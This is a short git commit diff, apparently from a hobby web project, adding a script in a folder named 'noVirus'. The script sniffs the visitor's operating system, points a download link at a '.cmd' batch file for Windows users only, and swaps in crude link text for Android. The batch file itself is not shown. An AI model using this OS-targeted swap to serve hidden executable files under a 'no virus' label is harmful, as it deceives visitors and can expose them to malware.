405630aab5be8aad584d816d3715bcd984d5189d
Timon Rosenbichler <timon.rosenbichler@gmx.at>
2022-12-12 14:27:39 +0100

    get os

---
+++ pages/noVirus/main.js
@@ -0,0 +1,25 @@
+let down = document.getElementById('download')
+function getOS() {
+    var userAgent = window.navigator.userAgent,
+        platform = window.navigator?.userAgentData?.platform || window.navigator.platform,
+        macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
+        windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
+        iosPlatforms = ['iPhone', 'iPad', 'iPod'],
+        os = null;
+  
+    if (macosPlatforms.indexOf(platform) !== -1) {
+      os = 'Mac OS';
+    } else if (iosPlatforms.indexOf(platform) !== -1) {
+      os = 'iOS';
+    } else if (windowsPlatforms.indexOf(platform) !== -1) {
+      //Windows
+      download.href='./best.cmd';
+    } else if (/Android/.test(userAgent)) {
+    //Fake Linux
+      download.innerHTML="android sex";
+    } else if (/Linux/.test(platform)) {
+      os = 'Linux';
+    }
+    
+  }
+  
